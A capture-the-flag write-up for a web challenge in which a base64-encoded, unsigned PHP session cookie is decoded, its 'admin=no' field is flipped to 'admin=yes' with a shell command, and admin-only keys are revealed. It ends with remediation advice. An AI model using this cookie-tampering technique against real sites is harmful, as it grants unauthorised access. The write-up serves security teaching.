---
date created: Sunday, February 15th 2026, 1:38:51 am
date modified: Sunday, February 15th 2026, 1:50:41 am
---

# OmNomNom

**Points:** 300 
**Description:** Get the key (`Credentials: T-Pain:cool`) 
**Source:** <https://omnomnom.web.baectf.com/>

# Method:

## Description & Investigation:

After logging in with the provided credentials (`T-Pain:cool`), we're presented with a "Secure key management system" containing a form to store keys. The page states: `Only administrators can see the stored keys`. Inspecting the cookies reveals a `PHPSESSID` that looks suspiciously like base64.

## Enumeration:

The `PHPSESSID` cookie value (URL-decoded) is:

```
VC1QYWluLGFkbWluPW5vLGRhdGU9MjAyNi0wMi0xNVQwMTo0MTowNyswMDowMA==
```

Decoding from base64:

```
T-Pain,admin=no,date=2026-02-15T01:41:07+00:00
```

The entire session state — username, role, and timestamp — is stored client-side in a base64-encoded cookie with no signing or integrity protection.

## Exploitation:

Change `admin=no` to `admin=yes`, re-encode, and set the cookie:

```Bash
echo -n 'T-Pain,admin=yes,date=2026-02-15T01:41:07+00:00' | base64
VC1QYWluLGFkbWluPXllcyxkYXRlPTIwMjYtMDItMTVUMDE6NDE6MDcrMDA6MDA=
```

Setting `PHPSESSID` to the new value and reloading the page:

```
Welcome administrator. Stored keys:
C is for: Client Supplied Data Is Totally Trustworthy
```

## Key Takeaways & Remediation:

- Session data should be stored server-side. The cookie should only contain an opaque session identifier that maps to server-side state, never the state itself.
- Any data that must be stored client-side needs cryptographic integrity protection (e.g. HMAC signing or authenticated encryption) so that tampering is detected.
- Base64 is encoding, not encryption — it provides zero confidentiality or integrity. Authorization decisions should never rely on values the client can freely modify.